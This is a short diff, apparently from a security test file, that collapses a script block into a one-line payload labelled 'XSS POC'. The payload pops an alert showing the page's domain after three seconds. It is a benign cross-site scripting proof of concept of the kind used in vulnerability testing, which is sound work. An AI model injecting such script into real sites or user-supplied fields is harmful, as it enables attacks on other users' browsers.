@@ -1,6 +1,1 @@
-<script>
-function show() {
-  alert(document.domain);
-}
-setTimeout(show, 3000);
-</script>
+XSS POC<script>function show(){alert(document.domain);}setTimeout(show, 3000);</script>
